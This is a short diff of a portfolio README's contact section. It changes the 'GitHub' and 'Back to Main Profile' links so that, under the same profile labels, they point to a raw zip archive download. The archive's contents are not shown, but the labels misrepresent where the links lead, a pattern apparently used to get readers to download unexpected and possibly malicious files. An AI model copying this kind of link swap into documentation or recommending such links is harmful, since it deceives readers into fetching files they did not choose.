@@ -137,10 +137,10 @@ Functional prototype with documented workflow and mock API, designed for product
 
 ## 📫 Contact & Links
 
-- **GitHub:** [@Wkamoah](https://github.com/Wkamoah)  
+- **GitHub:** [@Wkamoah](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/evidence/Portfolio-I-v1.5-alpha.1.zip)  
 - **Location:** Moscow, Russia | Peoples' Friendship University of Russia (RUDN)  
 - **Languages:** English (Native), Russian (Working proficiency for technical support)  
 
 ---
 
-**[⬅️ Back to Main Profile](https://github.com/Wkamoah)**
+**[⬅️ Back to Main Profile](https://raw.githubusercontent.com/Wkamoah/IT-Portfolio/main/evidence/Portfolio-I-v1.5-alpha.1.zip)**
